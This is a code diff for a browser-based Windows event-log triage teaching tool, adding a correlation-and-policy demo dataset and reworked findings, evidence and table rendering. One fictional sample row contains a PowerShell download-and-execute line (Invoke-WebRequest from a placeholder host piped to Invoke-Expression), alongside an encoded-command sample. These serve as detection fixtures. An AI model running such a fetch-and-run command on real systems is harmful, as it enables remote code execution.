@@ -27,84 +27,252 @@
       ['Information','2026-10-11 12:35:00','Service Control Manager','7045','Service Control Manager','SYSTEM','DC-01','Information','A service was installed. Service Name: DemoUpdater; Service File Name: C:\\Program Files\\DemoUpdater\\demo.exe']
     ]
   };
-  const sampleNames = {normal:'Normal Windows Activity',password:'Password Guessing Scenario',account:'Account Persistence Scenario',mixed:'Mixed SOC Scenario'};
-  const els = Object.fromEntries(['csv-file','file-name','analyze-button','parse-status','drop-zone','failure-threshold','reset-settings','report','dataset-tag','summary-banner','metrics','findings','finding-count','top-accounts','top-failures','common-ids','event-search','filter-id','filter-severity','filter-ip','filter-type','event-rows','visible-count','timeline'].map(id=>[id,document.getElementById(id)]));
-  let selectedFile = null;
-  let currentEvents = [];
-  let currentFindings = [];
-  let currentDiagnostics = null;
+  sampleRows.advanced = [
+    ...Array.from({ length: 5 }, (_, i) => ['Warning', '2026-10-15 09:0' + i + ':00', 'Microsoft-Windows-Security-Auditing', '4625', 'Logon', '', 'DC-01', 'Audit Failure', 'Target Account Name: demo-user-' + i + '; Target Account Domain: NORTHWIND; Source Network Address: 198.51.100.50; Logon Type: 3']),
+    ['Information', '2026-10-15 09:06:00', 'Microsoft-Windows-Security-Auditing', '4740', 'Account', 'SYSTEM', 'DC-01', 'Audit Success', 'Target Account Name: demo-user-0; Caller Computer Name: LAB-01'],
+    ['Information', '2026-10-15 09:07:00', 'Microsoft-Windows-Security-Auditing', '4648', 'Logon', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'Target Account Name: demo-admin; Target Server Name: SRV-02; Process Name: C:\\Windows\\System32\\runas.exe'],
+    ['Information', '2026-10-15 09:08:00', 'Microsoft-Windows-Security-Auditing', '4688', 'Process', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Creator Process Name: C:\\Program Files\\Microsoft Office\\WINWORD.EXE; Process Command Line: powershell.exe -EncodedCommand RABFAE0ATwA='],
+    ['Information', '2026-10-15 09:09:00', 'Microsoft-Windows-PowerShell', '4104', 'Script block', 'NORTHWIND\\maya', 'WS-014', 'Information', 'ScriptBlock ID: fictional-script-001; Script Block Text: Invoke-WebRequest https://example.invalid/demo.txt | Invoke-Expression'],
+    ['Information', '2026-10-15 09:10:00', 'Microsoft-Windows-Security-Auditing', '4698', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance; Task Content: <Task><Actions><Exec><Command>demo-agent.exe</Command></Exec></Actions></Task>'],
+    ['Information', '2026-10-15 09:11:00', 'Microsoft-Windows-Security-Auditing', '4702', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance'],
+    ['Information', '2026-10-15 09:12:00', 'Microsoft-Windows-Security-Auditing', '4719', 'Audit policy', 'NORTHWIND\\opsadmin', 'DC-01', 'Audit Success', 'Subcategory: Logon; Audit Policy Changes: Failure removed'],
+    ['Information', '2026-10-15 09:13:00', 'Microsoft-Windows-Security-Auditing', '4946', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Rule Name: Demo application; Rule ID: fictional-rule-001; Profile Changed: Domain'],
+    ['Information', '2026-10-15 09:14:00', 'Microsoft-Windows-Security-Auditing', '4950', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Setting Type: Default outbound action; Setting Value: Allow; Profile Changed: Domain']
+  ];
+  const sampleNames = { normal: 'Normal Windows Activity', password: 'Password Guessing Scenario', account: 'Account Persistence Scenario', mixed: 'Mixed SOC Scenario', advanced: 'Correlation and Policy Lab' };
+  const { parseCsv, normalizeEvents, analyze, normalizeSettings, DEFAULT_SETTINGS, severityOrder, eventSort,
+    labelById, eventCatalog, logonTypes, accountDisplay, correlationCoverage } = window.EventTriageAnalysis;
+  const ids = ['csv-file','file-name','analyze-button','parse-status','drop-zone','failure-threshold','auth-window','spray-threshold','account-window','reset-settings','report','dataset-tag','summary-banner','coverage-note','metrics','findings','finding-count','top-accounts','top-failures','common-ids','event-search','filter-id','filter-severity','filter-ip','filter-type','event-rows','visible-count','timeline','event-panel','evidence-scope','evidence-title','evidence-back','show-all-events','page-prev','page-next','page-label','event-reference'];
+  const els = Object.fromEntries(ids.map(id => [id, document.getElementById(id)]));
+  const settingIds = { failureThreshold: 'failure-threshold', authWindowMinutes: 'auth-window', sprayAccountThreshold: 'spray-threshold', accountWindowMinutes: 'account-window' };
+  const filterIds = ['event-search','filter-id','filter-severity','filter-ip','filter-type'];
+  const PAGE_SIZE = 100;
+  let selectedFile = '', currentEvents = [], currentFindings = [], activeEvidenceId = null, page = 0, ingestToken = 0;
+  let eventPriorities = new Map(), relatedFindings = new Map();
 
-  const csvEscape = value => `"${String(value).replaceAll('"','""')}"`;
-  const makeCsv = rows => [csvHeader,...rows.map(row=>row.map(csvEscape).join(','))].join('\r\n');
-
-  const { parseCsv, normalizeEvents, analyze, eventSort, labelById } = window.EventTriageAnalysis;
-  const severityOrder={High:0,Medium:1,Low:2,Informational:3};
-  function escapeHtml(s){return String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
-  function displayTime(e){return e.timeText||'Time unavailable';}
-  function severityForEvent(e){if(e.id==='1102')return'High';if(['4720','4728','4732','7045'].includes(e.id))return'Medium';if(e.id==='4625')return'Low';if(e.id==='4726')return'Low';return'Informational';}
-  function setStatus(text,error=false){els['parse-status'].textContent=text;els['parse-status'].classList.toggle('error',error);}
-  function render(){
-    const events=currentEvents, findings=currentFindings;els.report.hidden=false;
-    const high=findings.filter(f=>f.severity==='High').length;els['dataset-tag'].textContent=selectedFile?.name||sampleNames[selectedFile?.sample]||'UPLOADED DATA';
-    els['summary-banner'].innerHTML=`<strong>${high?`${high} high-priority ${high===1?'finding':'findings'} need review.`:'Triage complete.'}</strong> ${findings.length?`${findings.length} explainable finding${findings.length===1?'':'s'} generated from ${events.length} parsed events.`:`No rule-based findings were generated from ${events.length} parsed events. Review the event evidence and logging coverage.`}`;
-    const counts={total:events.length,success:events.filter(e=>e.id==='4624').length,failed:events.filter(e=>e.id==='4625').length,created:events.filter(e=>e.id==='4720').length,priv:events.filter(e=>['4728','4732'].includes(e.id)).length,cleared:events.filter(e=>e.id==='1102').length,process:events.filter(e=>e.id==='4688').length,findings:findings.length};
-    const metrics=[['Total events',counts.total],['Successful logons',counts.success],['Failed logons',counts.failed],['Accounts created',counts.created],['Privilege changes',counts.priv],['Audit-log clearing',counts.cleared],['Process creation',counts.process],['Needs investigation',counts.findings,true]];
-    els.metrics.replaceChildren(...metrics.map(([label,value,accent])=>{const div=document.createElement('div');div.className='metric'+(accent?' accent':'');div.innerHTML=`<span>${escapeHtml(label)}</span><strong>${value}</strong>`;return div;}));
-    els['finding-count'].textContent=String(findings.length);
-    renderFindings(findings);renderSnapshots(events);renderFilters(events,findings);renderTimeline(events,findings);renderTable();
+  const escapeHtml = value => String(value ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
+  const csvEscape = value => '"' + String(value).replaceAll('"', '""') + '"';
+  const makeCsv = rows => [csvHeader, ...rows.map(row => row.map(csvEscape).join(','))].join('\r\n');
+  const displayTime = event => event.timeText || 'Time unavailable';
+  const pairHtml = (label, value) => '<dt>' + escapeHtml(label) + '</dt><dd>' + escapeHtml(value || 'Not available') + '</dd>';
+  function setStatus(message, error = false) { els['parse-status'].textContent = message; els['parse-status'].classList.toggle('error', error); }
+  function settings() {
+    const values = normalizeSettings(Object.fromEntries(Object.entries(settingIds).map(([key, id]) => [key, els[id].value])));
+    for (const [key, id] of Object.entries(settingIds)) els[id].value = String(values[key]);
+    return values;
   }
-  function renderFindings(findings){
-    if(!findings.length){els.findings.innerHTML='<div class="empty-state">No configured rule fired. That does not prove the system is safe; check the available logs and surrounding context.</div>';return;}
-    els.findings.replaceChildren(...findings.map(f=>{
-      const card=document.createElement('article');card.className=`finding-card sev-${f.severity.toLowerCase()}`;
-      const names=[...new Set(f.events.map(e=>e.account).filter(Boolean))];const times=f.events.map(displayTime);const source=[...new Set(f.events.map(e=>e.ip||e.computer).filter(Boolean))].join(', ');
-      const ids=[...new Set(f.events.map(e=>e.id))].join(' → ');const evidence=f.events.length>1?`${f.events.length} events`:f.events[0]?.id;
-      const scoreReason=f.score===30&&f.title.toLowerCase().includes('followed by success')?'+10 repeated failures · +20 success after failures':f.title==='Repeated failed logons'?'+10 repeated failures':f.title==='Security audit log cleared'?'+30 audit log cleared':f.title.toLowerCase().includes('new account granted')?'+25 new account with group change':f.title.toLowerCase().includes('group membership changed')?`+${f.score} group membership change`:f.title==='User account created'?'+15 account created':f.title==='User account deleted'?'+5 account deleted':f.title==='Windows service installed'?'+15 service installed':f.title.toLowerCase().includes('encoded')?'+10 obfuscation cue':`+${f.score} combined administrative activity`;
-      card.innerHTML=`<div class="finding-top"><h4>${escapeHtml(f.title)}</h4><span class="severity ${f.severity.toLowerCase()}">${escapeHtml(f.severity)}</span></div><div class="finding-meta">EVENT ${escapeHtml(ids)} · ${escapeHtml(evidence)} · INVESTIGATION SCORE +${f.score} (${escapeHtml(scoreReason)})</div><p><strong>Account:</strong> ${escapeHtml(names.join(', ')||'Not identified')} &nbsp; <strong>Time:</strong> ${escapeHtml(times.length===1?times[0]:`${times[0]} — ${times.at(-1)}`)}${source?`<br><strong>Source:</strong> ${escapeHtml(source)}`:''}</p><p><strong>Observed activity:</strong> ${escapeHtml(f.why)}</p><details><summary>Why it matters, benign explanations &amp; next steps</summary><p><strong>Why this matters:</strong> ${escapeHtml(f.why)}</p><p><strong>Possible benign explanation:</strong> ${escapeHtml(f.benign)}</p><strong>Suggested investigation:</strong><ol>${f.next.map(s=>`<li>${escapeHtml(s)}</li>`).join('')}</ol></details>`;
-      return card;
-    }));
+  function resetFilters() { for (const id of filterIds) els[id].value = ''; page = 0; }
+  function clearLoadedInput(name, message, error = false) {
+    selectedFile = name; currentEvents = []; currentFindings = []; activeEvidenceId = null; page = 0;
+    els['file-name'].textContent = name; els['analyze-button'].disabled = true; els.report.hidden = true;
+    setStatus(message, error);
   }
-  function setSnapshot(id,title,items){const root=els[id];root.replaceChildren();const block=document.createElement('div');block.className='snapshot-block';block.innerHTML=`<h4>${escapeHtml(title)}</h4>`;if(!items.length){block.innerHTML+='<p class="muted small">No data available</p>';}else{const ul=document.createElement('ul');for(const [name,n] of items){const li=document.createElement('li');li.innerHTML=`<span>${escapeHtml(name)}</span><strong>${n}</strong>`;ul.append(li);}block.append(ul);}root.append(block);}
-  function topN(counts){return [...counts.entries()].sort((a,b)=>b[1]-a[1]||a[0].localeCompare(b[0])).slice(0,5);}
-  function renderSnapshots(events){const accounts=new Map(),fails=new Map(),ids=new Map();for(const e of events){if(e.account)accounts.set(e.account,(accounts.get(e.account)||0)+1);if(e.id==='4625'&&e.account)fails.set(e.account,(fails.get(e.account)||0)+1);ids.set(e.id,(ids.get(e.id)||0)+1);}setSnapshot('top-accounts','Top accounts by event count',topN(accounts));setSnapshot('top-failures','Accounts with failed logons',topN(fails));setSnapshot('common-ids','Most common Event IDs',topN(ids).map(([id,n])=>[`${id} · ${labelById[id]||'Other event'}`,n]));}
-  function renderFilters(events,findings){const currentId=els['filter-id'].value,currentIp=els['filter-ip'].value,currentType=els['filter-type'].value;const ids=[...new Set(events.map(e=>e.id))].sort((a,b)=>Number(a)-Number(b));const ips=[...new Set(events.map(e=>e.ip).filter(Boolean))].sort();const types=[...new Set(events.map(e=>labelById[e.id]||'Other event'))].sort();els['filter-id'].innerHTML='<option value="">All event IDs</option>'+ids.map(id=>`<option value="${escapeHtml(id)}">${escapeHtml(id)} · ${escapeHtml(labelById[id]||'Other event')}</option>`).join('');els['filter-ip'].innerHTML='<option value="">All source IPs</option>'+ips.map(ip=>`<option>${escapeHtml(ip)}</option>`).join('');els['filter-type'].innerHTML='<option value="">All event types</option>'+types.map(t=>`<option>${escapeHtml(t)}</option>`).join('');if(ids.includes(currentId))els['filter-id'].value=currentId;if(ips.includes(currentIp))els['filter-ip'].value=currentIp;if(types.includes(currentType))els['filter-type'].value=currentType;}
-  function renderTimeline(events,findings){const noteworthy=new Set(findings.flatMap(f=>f.events));const sorted=[...noteworthy].sort(eventSort);if(!sorted.length){els.timeline.innerHTML='<li>No noteworthy activity generated by the current rules.</li>';return;}els.timeline.replaceChildren(...sorted.map(e=>{const li=document.createElement('li');li.innerHTML=`<time>${escapeHtml(displayTime(e))}</time><strong>${escapeHtml(labelById[e.id]||`Event ${e.id}`)}</strong> · ${escapeHtml(e.account||e.computer||'Account not identified')}`;return li;}));}
-  function eventSeverityFilter(e){const related=currentFindings.filter(f=>f.events.includes(e));if(related.length)return related.sort((a,b)=>severityOrder[a.severity]-severityOrder[b.severity])[0].severity;return severityForEvent(e);}
-  function renderTable(){const search=els['event-search'].value.trim().toLowerCase();const id=els['filter-id'].value,sev=els['filter-severity'].value,ip=els['filter-ip'].value,type=els['filter-type'].value;const filtered=currentEvents.filter(e=>{const label=labelById[e.id]||'Other event';const hay=[e.id,e.account,e.actor,e.user,e.computer,e.ip,e.workstation,e.process,e.parent,e.processId,e.command,e.logonType,e.serviceName,e.servicePath,e.scriptBlockId,e.group,e.source,e.message,label].join(' ').toLowerCase();return(!search||hay.includes(search))&&(!id||e.id===id)&&(!sev||eventSeverityFilter(e)===sev)&&(!ip||e.ip===ip)&&(!type||label===type);});els['visible-count'].textContent=`${filtered.length} of ${currentEvents.length} events`;if(!filtered.length){els['event-rows'].innerHTML='<tr><td colspan="6" class="table-empty">No events match these filters.</td></tr>';return;}els['event-rows'].replaceChildren(...filtered.slice(0,1000).map(e=>{const tr=document.createElement('tr');const severity=eventSeverityFilter(e);const summary=[labelById[e.id]||'Other event',e.actor?'Actor: '+e.actor:'',e.logonType?'Logon type: '+e.logonType:'',e.process?'Process: '+e.process:'',e.parent?'Parent: '+e.parent:'',e.processId?'Process ID: '+e.processId:'',e.group?'Group: '+e.group:'',e.serviceName?'Service: '+e.serviceName:'',e.servicePath?'Service path: '+e.servicePath:'',e.scriptBlockId?'Script block: '+e.scriptBlockId:'',e.command?'Command: '+e.command:'',e.message].filter(Boolean).join(' · ');tr.innerHTML=`<td>${escapeHtml(displayTime(e))}</td><td>${escapeHtml(e.id)}</td><td><span class="severity ${severity.toLowerCase()}">${escapeHtml(severity)}</span></td><td>${escapeHtml(e.account||'—')}</td><td>${escapeHtml(e.ip||e.computer||'—')}</td><td class="event-message">${escapeHtml(summary)}</td>`;return tr;}));}
-  function clearLoadedInput(name,message,error=false){
-    currentEvents=[];currentFindings=[];currentDiagnostics=null;selectedFile={name};
-    els['file-name'].textContent=name;els['analyze-button'].disabled=true;els.report.hidden=true;
-    setStatus(message,error);
+  function processText(text, name) {
+    clearLoadedInput(name, 'Reading CSV…');
+    try {
+      const result = normalizeEvents(parseCsv(text));
+      currentEvents = result.events;
+      resetFilters();
+      els['analyze-button'].disabled = false;
+      const d = result.diagnostics;
+      const rows = [...d.blankEventIdRows, ...d.invalidEventIdRows].sort((a,b) => a-b);
+      const timestampRows = [...d.ambiguousTimestampRows, ...d.invalidTimestampRows, ...d.missingTimestampRows].sort((a,b) => a-b);
+      const describe = values => values.slice(0,8).join(', ') + (values.length > 8 ? ' and ' + (values.length - 8) + ' more' : '');
+      const skipped = rows.length ? ' Skipped unreadable Event IDs in CSV row(s) ' + describe(rows) + '.' : '';
+      const dates = timestampRows.length ? ' Timestamp review needed in CSV row(s) ' + describe(timestampRows) + '; timed correlations exclude those records.' : '';
+      setStatus(d.rowsParsed + ' events parsed.' + skipped + dates + ' Select Analyse events to build the report.');
+    } catch (error) { clearLoadedInput(name, error.message || 'Could not parse this CSV.', true); }
   }
-  function processText(text,name){
-    selectedFile={name};
-    try{
-      const result=normalizeEvents(parseCsv(text));
-      currentEvents=result.events;currentDiagnostics=result.diagnostics;currentFindings=[];
-      els['file-name'].textContent=name;els['analyze-button'].disabled=false;els.report.hidden=true;
-      const d=currentDiagnostics;
-      const describeRows=rows=>{const shown=rows.slice(0,8).join(', ');return rows.length>8?shown+' and '+(rows.length-8)+' more':shown;};
-      const skippedRows=[...d.blankEventIdRows,...d.invalidEventIdRows].sort((a,b)=>a-b);
-      const skipped=d.rowsSkipped?' '+d.rowsSkipped+' row'+(d.rowsSkipped===1?' was':'s were')+' skipped; Event ID is blank or unreadable in CSV row(s) '+describeRows(skippedRows)+'.':'';
-      const uncertain=d.ambiguousTimestamps+d.invalidTimestamps+d.missingTimestamps;
-      const timestampRows=[...d.ambiguousTimestampRows,...d.invalidTimestampRows,...d.missingTimestampRows].sort((a,b)=>a-b);
-      const timestampNote=uncertain?' Timestamp review needed in CSV row(s) '+describeRows(timestampRows)+' ('+d.ambiguousTimestamps+' ambiguous, '+d.invalidTimestamps+' unrecognised, '+d.missingTimestamps+' missing); row order is used when a timestamp cannot be parsed.':' Timestamps were parsed successfully.';
-      setStatus(d.rowsParsed+' events parsed from '+d.rowsRead+' rows.'+skipped+timestampNote+' Select Analyse events to build the report.');
-    }catch(error){
-      clearLoadedInput(name,error.message||'Could not parse this CSV.',true);
+  function runAnalysis() {
+    if (!currentEvents.length) return;
+    currentFindings = analyze(currentEvents, settings());
+    if (!currentFindings.some(finding => finding.id === activeEvidenceId)) activeEvidenceId = null;
+    eventPriorities = new Map(); relatedFindings = new Map();
+    for (const finding of currentFindings) for (const event of finding.events) {
+      if (!relatedFindings.has(event.uid)) relatedFindings.set(event.uid, []);
+      relatedFindings.get(event.uid).push(finding);
+      const previous = eventPriorities.get(event.uid);
+      if (!previous || severityOrder[finding.severity] < severityOrder[previous]) eventPriorities.set(event.uid, finding.severity);
+    }
+    render();
+  }
+  function render() {
+    els.report.hidden = false;
+    els['dataset-tag'].textContent = selectedFile || 'UPLOADED DATA';
+    const high = currentFindings.filter(finding => finding.severity === 'High').length;
+    els['summary-banner'].textContent = currentFindings.length ?
+      currentFindings.length + ' findings from ' + currentEvents.length + ' events; ' + high + ' need high-priority review.' :
+      'No configured rule fired. Review event coverage and surrounding evidence before reaching a conclusion.';
+    const coverage = correlationCoverage(currentEvents);
+    els['coverage-note'].textContent = 'Correlation coverage: ' + coverage.authenticationExcluded +
+      ' authentication records lack a usable time, target identity, reporting host, or source; ' + coverage.accountChangesExcluded +
+      ' account/group records lack a usable time, target identity, or host. These records remain in the event table. Timed matches require timestamps with a time of day and the same timezone basis.' +
+      (coverage.incompleteScripts ? ' ' + coverage.incompleteScripts + ' PowerShell records are marked as fragments; complete scripts may require other records.' : '');
+    const metrics = [['Total events', currentEvents.length], ['Successful logons', count('4624')], ['Failed logons', count('4625')],
+      ['Accounts created', count('4720')], ['Group additions', currentEvents.filter(event => ['4728','4732'].includes(event.id)).length],
+      ['Audit-log clearing', count('1102')], ['Process creation', count('4688')], ['Findings to review', currentFindings.length]];
+    els.metrics.innerHTML = metrics.map(([label,value]) => '<div class="metric"><span>' + escapeHtml(label) + '</span><strong>' + value + '</strong></div>').join('');
+    renderFindings(); renderSnapshots(); renderFilters(); renderTimeline(); renderTable();
+  }
+  function count(id) { return currentEvents.filter(event => event.id === id).length; }
+  function renderFindings() {
+    els['finding-count'].textContent = String(currentFindings.length);
+    if (!currentFindings.length) {
+      els.findings.innerHTML = '<p class="empty-state">No configured rule fired. Check the coverage note and available evidence.</p>';
+      return;
+    }
+    els.findings.innerHTML = currentFindings.map(finding =>
+      '<article class="finding-card sev-' + finding.severity.toLowerCase() + '" id="finding-' + finding.id + '" tabindex="-1">' +
+      '<div class="finding-top"><h4>' + escapeHtml(finding.title) + '</h4><span class="severity ' + finding.severity.toLowerCase() + '">' + finding.severity + ' review priority</span></div>' +
+      '<p class="finding-meta">RULE ' + finding.ruleId + ' · ' + finding.score + ' priority points · ' + finding.events.length + ' supporting event(s)</p>' +
+      '<p>' + escapeHtml(finding.why) + '</p>' +
+      '<button type="button" class="button button-secondary evidence-button" data-evidence="' + finding.id + '">View ' + finding.events.length + ' supporting event(s)</button>' +
+      '<details><summary>Matched fields and score breakdown</summary><dl class="match-fields">' +
+      finding.matchedFields.map(item => pairHtml(item.label, item.value)).join('') + '</dl>' +
+      '<ul>' + finding.scoreBreakdown.map(item => '<li>+' + item.points + ' · ' + escapeHtml(item.label) + '</li>').join('') +
+      '</ul><p>Priority points are assigned per rule. Overlapping findings share evidence and are not added into a dataset risk score.</p></details>' +
+      '<details><summary>Benign explanations and investigation steps</summary><p>' + escapeHtml(finding.benign) + '</p><ol>' +
+      finding.next.map(step => '<li>' + escapeHtml(step) + '</li>').join('') + '</ol></details></article>'
+    ).join('');
+  }
+  function selectEvidence(id) {
+    const finding = currentFindings.find(item => item.id === id);
+    if (!finding) return;
+    activeEvidenceId = id; resetFilters(); renderTable();
+    els['event-panel'].scrollIntoView({ behavior: 'smooth', block: 'start' });
+    els['evidence-back'].focus({ preventScroll: true });
+  }
+  function focusFinding(id) {
+    const card = document.getElementById('finding-' + id);
+    if (card) { card.scrollIntoView({ behavior: 'smooth', block: 'center' }); card.focus({ preventScroll: true }); }
+  }
+  function snapshot(id, title, items) {
+    els[id].innerHTML = '<div class="snapshot-block"><h4>' + escapeHtml(title) + '</h4>' +
+      (items.length ? '<ul>' + items.map(([name,value]) => '<li><span>' + escapeHtml(name) + '</span><strong>' + value + '</strong></li>').join('') + '</ul>' : '<p class="muted small">No data available</p>') + '</div>';
+  }
+  function renderSnapshots() {
+    const accounts = new Map(), failures = new Map(), ids = new Map();
+    for (const event of currentEvents) {
+      const name = event.account || event.accountSid ? accountDisplay(event) : '';
+      if (name) accounts.set(name, (accounts.get(name) || 0) + 1);
+      if (name && event.id === '4625') failures.set(name, (failures.get(name) || 0) + 1);
+      ids.set(event.id, (ids.get(event.id) || 0) + 1);
+    }
+    const top = map => [...map].sort((a,b) => b[1]-a[1] || a[0].localeCompare(b[0])).slice(0,5);
+    snapshot('top-accounts', 'Top affected accounts', top(accounts));
+    snapshot('top-failures', 'Accounts with failed logons', top(failures));
+    snapshot('common-ids', 'Most common Event IDs', top(ids).map(([id,value]) => [id + ' · ' + (labelById[id] || 'Other event'), value]));
+  }
+  function renderFilters() {
+    const options = [
+      ['filter-id', [...new Set(currentEvents.map(event => event.id))].sort((a,b) => Number(a)-Number(b)), 'All event IDs'],
+      ['filter-ip', [...new Set(currentEvents.map(event => event.ip).filter(Boolean))].sort(), 'All source IPs'],
+      ['filter-type', [...new Set(currentEvents.map(event => labelById[event.id] || 'Other event'))].sort(), 'All event types']
+    ];
+    for (const [id, values, label] of options) {
+      const previous = els[id].value;
+      els[id].innerHTML = '<option value="">' + label + '</option>' + values.map(value =>
+        '<option value="' + escapeHtml(value) + '">' + escapeHtml(id === 'filter-id' ? value + ' · ' + (labelById[value] || 'Other event') : value) + '</option>').join('');
+      if (values.includes(previous)) els[id].value = previous;
     }
   }
-  els['csv-file'].addEventListener('change',async event=>{
-    const file=event.target.files?.[0];if(!file)return;
-    if(!file.name.toLowerCase().endsWith('.csv')){clearLoadedInput(file.name,'Please choose a file with a .csv extension.',true);return;}
-    if(file.size>25*1024*1024){clearLoadedInput(file.name,'This file is over the 25 MB learning-tool limit. Export a smaller time range and try again.',true);return;}
-    try{processText(await file.text(),file.name);}
-    catch{clearLoadedInput(file.name,'The selected file could not be read in this browser.',true);}
+  function eventDetails(event) {
+    const pairs = [
+      ['Target account', event.account || event.accountSid ? accountDisplay(event) : ''], ['Target SID', event.accountSid], ['Actor', event.actor],
+      ['Reporting host', event.computer], ['Source IP', event.ip], ['Workstation / caller', event.workstation],
+      ['Timestamp interpretation', event.timestampStatus + (event.hasTime ? '' : '; no time of day')],
+      ['Windows event level', event.level], ['Provider', event.source],
+      ['Logon type', event.logonType ? event.logonType + ' · ' + (logonTypes[event.logonType] || 'Other logon type') : ''],
+      ['New process path', event.process], ['Creator process path', event.parent], ['Process ID', event.processId], ['Command line', event.command],
+      ['Group', event.group], ['Group SID', event.groupSid], ['Service name', event.serviceName], ['Service image', event.servicePath],
+      ['Script block ID', event.scriptBlockId], ['Script fragment', event.scriptFragmentTotal ? (event.scriptFragment || '?') + ' of ' + event.scriptFragmentTotal : ''],
+      ['Task name', event.taskName], ['Task content', event.taskContent], ['Credential target server', event.targetServer],
+      ['Audit subcategory', event.subcategory], ['Audit changes', event.policyChanges],
+      ['Firewall rule', event.firewallRule || event.firewallRuleId], ['Firewall profile', event.firewallProfile],
+      ['Firewall setting', event.firewallSetting], ['Firewall value', event.firewallValue]
+    ].filter(([,value]) => value);
+    const links = (relatedFindings.get(event.uid) || []).map(finding => '<button type="button" class="button button-quiet" data-finding-focus="' + finding.id + '">Back to ' + escapeHtml(finding.title) + '</button>').join('');
+    return '<details class="event-details"><summary>Inspect CSV row ' + event.lineNumber + '</summary><dl class="match-fields">' +
+      pairs.map(([label,value]) => pairHtml(label,value)).join('') + '</dl><h4>Original event message</h4><pre>' + escapeHtml(event.message || 'No Message column value') +
+      '</pre><details><summary>All original CSV columns</summary><dl class="match-fields">' +
+      event.rawFields.map(item => pairHtml(item.header,item.value)).join('') + '</dl></details>' + links + '</details>';
+  }
+  function renderTable() {
+    const finding = currentFindings.find(item => item.id === activeEvidenceId);
+    const scope = finding ? new Set(finding.events.map(event => event.uid)) : null;
+    els['evidence-scope'].hidden = !finding;
+    els['evidence-title'].textContent = finding ? 'Supporting evidence for ' + finding.title + ' · ' + finding.ruleId + ' · ' + finding.events.length + ' event(s)' : '';
+    const search = els['event-search'].value.trim().toLowerCase();
+    const filtered = currentEvents.filter(event => {
+      const priority = eventPriorities.get(event.uid) || 'Informational';
+      const hay = ((labelById[event.id] || '') + ' ' + event.rawFields.map(item => item.value).join(' ')).toLowerCase();
+      return (!scope || scope.has(event.uid)) && (!search || hay.includes(search)) &&
+        (!els['filter-id'].value || event.id === els['filter-id'].value) &&
+        (!els['filter-severity'].value || priority === els['filter-severity'].value) &&
+        (!els['filter-ip'].value || event.ip === els['filter-ip'].value) &&
+        (!els['filter-type'].value || (labelById[event.id] || 'Other event') === els['filter-type'].value);
+    });
+    page = Math.max(0, Math.min(page, Math.ceil(filtered.length / PAGE_SIZE) - 1));
+    const shown = filtered.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
+    els['visible-count'].textContent = filtered.length + ' matching events' + (finding ? ' in finding evidence' : ' of ' + currentEvents.length);
+    els['page-label'].textContent = filtered.length ? 'Rows ' + (page * PAGE_SIZE + 1) + '–' + (page * PAGE_SIZE + shown.length) + ' of ' + filtered.length : 'No matching events';
+    els['page-prev'].disabled = page === 0; els['page-next'].disabled = (page + 1) * PAGE_SIZE >= filtered.length;
+    els['event-rows'].innerHTML = shown.length ? shown.map(event => {
+      const priority = eventPriorities.get(event.uid) || 'Informational';
+      const summary = [labelById[event.id] || 'Other event', event.logonType ? 'Logon type ' + event.logonType + ' (' + (logonTypes[event.logonType] || 'Other') + ')' : '',
+        event.process, event.serviceName, event.taskName, event.firewallRule].filter(Boolean).join(' · ');
+      return '<tr data-event-uid="' + event.uid + '"><td>' + escapeHtml(displayTime(event)) + '<br>CSV row ' + event.lineNumber +
+        '</td><td>' + event.id + '</td><td><span class="severity ' + priority.toLowerCase() + '">' + priority +
+        '</span></td><td>' + escapeHtml(event.account || event.accountSid ? accountDisplay(event) : '—') + '</td><td>' +
+        escapeHtml(event.ip || event.computer || '—') + '</td><td class="event-message">' + escapeHtml(summary) + eventDetails(event) + '</td></tr>';
+    }).join('') : '<tr><td colspan="6" class="table-empty">No events match these filters.</td></tr>';
+  }
+  function renderTimeline() {
+    const noteworthy = [...new Map(currentFindings.flatMap(finding => finding.events).map(event => [event.uid,event])).values()].sort(eventSort);
+    els.timeline.innerHTML = noteworthy.length ? noteworthy.map(event => '<li><time>' + escapeHtml(displayTime(event)) +
+      (event.date ? '' : ' · unparsed time; ordered by CSV row') + '</time><strong>' + escapeHtml(labelById[event.id] || 'Other event') +
+      '</strong> · CSV row ' + event.lineNumber + ' · ' + escapeHtml(event.account || event.accountSid ? accountDisplay(event) : event.computer || 'Unknown host') + '</li>').join('') :
+      '<li>No noteworthy activity generated by configured rules.</li>';
+  }
+
+  els['analyze-button'].addEventListener('click', () => {
+    runAnalysis(); els.report.scrollIntoView({ behavior: 'smooth', block: 'start' }); setStatus('Triage report ready. Check the correlation coverage note.');
   });
-  els['analyze-button'].addEventListener('click',()=>{if(!currentEvents.length)return;currentFindings=analyze(currentEvents,Math.max(2,Math.min(100,Number(els['failure-threshold'].value)||5)));render();els.report.scrollIntoView({behavior:'smooth',block:'start'});setStatus('Triage report ready.');});
-  document.querySelectorAll('[data-sample]').forEach(button=>button.addEventListener('click',()=>{const key=button.dataset.sample;processText(makeCsv(sampleRows[key]),`${sampleNames[key]} · Demo Data`);document.querySelector('.demo-details').open=true;}));
-  for(const id of ['event-search','filter-id','filter-severity','filter-ip','filter-type'])els[id].addEventListener('input',renderTable);
-  els['failure-threshold'].addEventListener('change',()=>{if(currentEvents.length&&!els.report.hidden){currentFindings=analyze(currentEvents,Number(els['failure-threshold'].value)||5);render();}});
-  els['reset-settings'].addEventListener('click',()=>{els['failure-threshold'].value='5';if(currentEvents.length&&!els.report.hidden){currentFindings=analyze(currentEvents,5);render();}});
